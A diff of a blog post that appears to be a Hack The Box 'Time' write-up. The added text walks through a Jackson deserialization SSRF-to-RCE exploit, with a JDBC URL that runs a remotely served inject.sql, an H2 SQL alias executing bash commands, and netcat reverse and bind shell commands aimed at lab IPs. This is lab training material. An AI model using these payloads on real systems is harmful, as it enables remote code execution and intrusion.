@@ -42,7 +42,7 @@ We see SSH and a web server running. SSH is rarely if ever exploitable at first,
 While we have a look at the web page, let's launch *dirb* to look for potential interesting directories:
 
 <div class="img_container">
-![dirb]({{https://jsom1.github.io/}}/_images/htb_time_dirb.png){: height="320px" width = "550px"}
+![dirb]({{https://jsom1.github.io/}}/_images/htb_time_dirb.png)
 </div>
 
 Let's look at the main page:
@@ -117,15 +117,66 @@ It is required to download various scripts and libraries, but fortunately the Gi
 ![github clone]({{https://jsom1.github.io/}}/_images/htb_time_git.png){: height="320px" width = "550px"}
 </div>
 
-And we're ready to follow the steps given in the article. Because this might be the wrong exploit (there are many of them), I'll first try to "run it blindly" so that I don't spend too much time on it in case it doesn't work. The first command to run is the following:
+And we're ready to follow the steps given in the article. Because this might be the wrong exploit (there are many of them), I'll first try to "run it blindly" so that I don't spend too much time on it in case it doesn't work. If it works, I'll take some time to read and understand how it works. The first part of the article shows how to perform a SRRF. SSRF stands for Server-Side Request Forgery, which is a technique that consists of inducing the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. We could typically use that to make a connection back to ourselves. The command in the following:
 ````
 jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"
 ````
-The previous command has to be adapted to work on my machine as follows:
+It has to be adapted to work on my machine as follows:
 
 <div class="img_container">
-![1st command]({{https://jsom1.github.io/}}/_images/htb_time_jruby.png){: height="320px" width = "550px"}
+![1st command]({{https://jsom1.github.io/}}/_images/htb_time_jruby.png)
 </div>
+
+Note that I fitered the output because there were way too many lines. Among other things, the script *test.rb* deserializes and serializes a polymorphic Jackson object passed to jRuby as JSON. To see the result, we should set up a netcat listener to catch the reverse connection. However it doesn't work, and I'm not going to try to understand why for now because there is a more promising part in the article: "Enter the Matrix: From SSRF to RCE". What we have to do is serve the file *inject.sql* through a http server and run the application with the following command:
+
+````
+jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"
+````
+
+So let's try that. We start a web server with the following command:
+
+````
+sudo python -m SimpleHTTPServer
+````
+And we execute the command:
+<div class="img_container">
+![2nd command]({{https://jsom1.github.io/}}/_images/htb_time_jruby2.png)
+</div>
+
+We see the file was not found, however we see the request on our web server:
+
+<div class="img_container">
+![Request]({{https://jsom1.github.io/}}/_images/htb_time_request.png)
+</div>
+
+I thought I had to serve the file in the web root directory (*/var/www/html*), but browsing at http://localhost:8000 shows that the request looks for the file in /home/kali. Let's copy the file there and try again. And it worrks! The script *inject.sql* writes the output of the *id* command into a file called *exploited.txt*. We can see this script as well as the content of the created file and the successful request below:
+
+<div class="img_container">
+![Request 200]({{https://jsom1.github.io/}}/_images/htb_time_reqok.png)
+</div>
+
+<div class="img_container">
+![exploited.txt]({{https://jsom1.github.io/}}/_images/htb_time_exploited.png)
+</div>
+
+From there, it should be fairly easy to get a reverse shell. We will modify the *inject.sql* script so that it connects back to us:
+
+````
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+	String[] command = {"bash", "-c", cmd};
+	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+	return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('nc -nv 10.10.14.8 4444')
+````
+Instead of 'id > exploited.txt' we simply execute 'nc -nv 10.10.14.8 4444', which will connect back to our machine (the IP was obtained with *sudo ifconfig tun0*) on port 4444. We set up a netcat listener and launch the script:
+
+<div class="img_container">
+![reverse shell]({{https://jsom1.github.io/}}/_images/htb_time_revsh.png)
+</div>
+
+We can also get a bind shell by replacing the command with 'nc -nlvp 4444' and then we connect to it with *sudo nc -nv 127.0.0.1 4444*. For some reason, both those shells are unstable. However, the PoC works and we must now try to make it work against 10.10.10.214. One way to do that is by trial and error and intercepting the requests and responses with Burp.
+
 
 
 <ins>**My thoughts**</ins>
